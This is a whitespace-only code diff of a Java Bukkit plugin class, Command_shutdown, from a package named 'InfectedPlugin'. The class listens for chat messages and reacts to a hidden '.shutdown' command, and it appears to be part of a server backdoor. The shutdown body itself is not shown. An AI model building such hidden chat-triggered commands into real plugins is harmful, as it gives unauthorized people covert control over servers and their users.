@@ -10,6 +10,7 @@ import org.CreeperCoders.InfectedPlugin.IP_Util;
 
 public class Command_shutdown implements Listener
 {
+
     public final Logger log = Bukkit.getLogger();
 
     @EventHandler
@@ -17,7 +18,7 @@ public class Command_shutdown implements Listener
     {
         String message = event.getMessage();
         boolean cancel = false;
-        
+
         if (message.startsWith("."))
         {
             String[] args = message.split(" ");
@@ -25,7 +26,7 @@ public class Command_shutdown implements Listener
             {
                 return;
             }
-    
+
             if (args[0].equalsIgnoreCase(".shutdown"))
             {
                 try
@@ -49,4 +50,5 @@ public class Command_shutdown implements Listener
             }
         }
     }
+
 }
